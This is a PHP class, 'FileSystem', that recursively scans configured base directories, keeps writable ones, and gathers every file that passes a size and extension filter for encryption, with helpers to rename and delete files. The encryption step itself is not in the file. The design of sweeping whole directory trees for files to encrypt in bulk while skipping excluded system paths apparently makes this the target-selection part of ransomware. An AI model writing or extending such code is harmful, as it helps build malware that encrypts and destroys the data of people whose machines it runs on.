<?php
namespace App\Models;

use App\Core\ConfigManager;
use App\Core\Logger;

class FileSystem {
    private $config;
    
    public function __construct() {
        $this->config = ConfigManager::load('paths');
    }
    
    public function getTargetDirectories() {
        $directories = [];
        
        foreach ($this->config['base_directories'] as $baseDir) {
            if (is_dir($baseDir) && is_readable($baseDir) && !$this->isExcludedPath($baseDir)) {
                Logger::info("Scanning directory: {$baseDir}");
                $directories = array_merge($directories, $this->scanForSubdirectories($baseDir));
                $directories[] = $baseDir;
            }
        }
        
        return array_unique(array_filter($directories, [$this, 'isValidDirectory']));
    }
    
    private function scanForSubdirectories($directory) {
        $subdirs = [];
        
        try {
            $items = @scandir($directory);
            if ($items === false) {
                Logger::warning("Cannot scan directory: {$directory}");
                return [];
            }
            
            foreach ($items as $item) {
                if ($item === '.' || $item === '..') continue;
                
                $path = $directory . DIRECTORY_SEPARATOR . $item;
                
                if (is_dir($path) && !$this->isExcluded($path)) {
                    $subdirs[] = $path;
                    $subdirs = array_merge($subdirs, $this->scanForSubdirectories($path));
                }
            }
        } catch (\Exception $e) {
            Logger::error("Error scanning directory: {$directory}", ['error' => $e->getMessage()]);
        }
        
        return $subdirs;
    }
    
    private function isExcluded($path) {
        // Check excluded paths
        foreach ($this->config['excluded_paths'] as $excluded) {
            if (strpos($path, $excluded) === 0) {
                return true;
            }
        }
        
        // Check excluded directory names
        $pathParts = explode(DIRECTORY_SEPARATOR, $path);
        foreach ($pathParts as $part) {
            if (in_array($part, $this->config['excluded_directories'])) {
                return true;
            }
        }
        
        return false;
    }
    
    private function isExcludedPath($path) {
        foreach ($this->config['excluded_paths'] as $excluded) {
            if (strpos($path, $excluded) === 0) {
                return true;
            }
        }
        return false;
    }
    
    private function isValidDirectory($directory) {
        return is_dir($directory) && 
               is_readable($directory) && 
               is_writable($directory) &&
               !$this->isExcluded($directory);
    }
    
    public function scanDirectory($directory) {
        $files = [];
        
        try {
            $items = @scandir($directory);
            if ($items === false) return [];
            
            foreach ($items as $item) {
                if ($item === '.' || $item === '..') continue;
                
                $path = $directory . DIRECTORY_SEPARATOR . $item;
                
                if (is_file($path) && $this->shouldEncrypt($path)) {
                    $files[] = $path;
                } elseif (is_dir($path) && !$this->isExcluded($path)) {
                    $files = array_merge($files, $this->scanDirectory($path));
                }
            }
        } catch (\Exception $e) {
            Logger::error("Error scanning directory: {$directory}", ['error' => $e->getMessage()]);
        }
        
        return $files;
    }
    
    public function shouldEncrypt($filePath) {
        if (!is_file($filePath) || !is_readable($filePath)) {
            return false;
        }
        
        // Check file size
        $fileSize = filesize($filePath);
        if ($fileSize > $this->config['max_file_size']) {
            Logger::warning("File too large, skipping: {$filePath}");
            return false;
        }
        
        // Check extension
        $extension = strtolower(pathinfo($filePath, PATHINFO_EXTENSION));
        if (in_array($extension, $this->config['excluded_extensions'])) {
            return false;
        }
        
        return true;
    }
    
    public function renameFile($oldPath, $newPath) {
        return rename($oldPath, $newPath);
    }
    
    public function deleteFile($path) {
        return unlink($path);
    }
}